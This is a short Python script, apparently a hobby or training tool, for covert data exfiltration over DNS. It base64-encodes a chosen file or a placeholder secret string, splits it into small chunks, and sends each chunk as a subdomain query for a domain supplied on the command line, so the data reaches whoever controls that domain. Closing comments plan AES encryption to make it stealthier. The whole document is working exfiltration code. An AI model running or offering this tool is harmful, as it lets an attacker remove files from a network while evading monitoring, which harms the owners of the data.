#!/usr/bin/python3
import base64, sys, argparse
import sendUDP

#Note - Can get stuck, CTRL + C moves it along!

dnsServer = "192.168.1.1"
dnsPort = 53

def requestFormer(data):
    base64Data = base64.b64encode(bytes(data, 'utf-8'))
    covertSubDomain = base64Data.decode("utf-8")
    url = (covertSubDomain + "." + domain)

    print("Original: " + data + '\n' + "Encoded URL: " + url)

    try:
        message = sendUDP.build_message("A", url) 
        response = sendUDP.send_udp_message(message, dnsServer, dnsPort)
        print("Sent DNS exfiltrated portion!")
    except:
        print("An error occured")



def filePrep(filename):
    f = open(filename, "rb")

    for line in f:
    #----------------------------------------------------------------------------------------------
    #https://stackoverflow.com/questions/13673060/split-string-into-strings-by-length

        lineLen=10
        linePart=[line[y-lineLen:y] for y in range(lineLen, len(line)+lineLen,lineLen)]
    #----------------------------------------------------------------------------------------------
        for part in linePart:
            requestFormer(str(part))

    f.close()

#https://docs.python.org/3/howto/argparse.html

if __name__ == "__main__":
    switchCheck = argparse.ArgumentParser()
    switchCheck.add_argument("-d", "--domain", help="Domain required to append malformed subdomain to") 
    switchCheck.add_argument("-f", "--filename", help="Optional - Instead of a static phrase, a file can be segmented and pushed")
    args = switchCheck.parse_args()

    if str(args.domain) == "None":
        switchCheck.print_help()
        exit()

    global domain
    domain = args.domain

    if args.filename:
        filePrep(args.filename)
    else:
        requestFormer("Super secret data")
        
#aes after, choice of base64 and aes256??
#play with lengths for efficiency, splitting base64 and aes strings too!
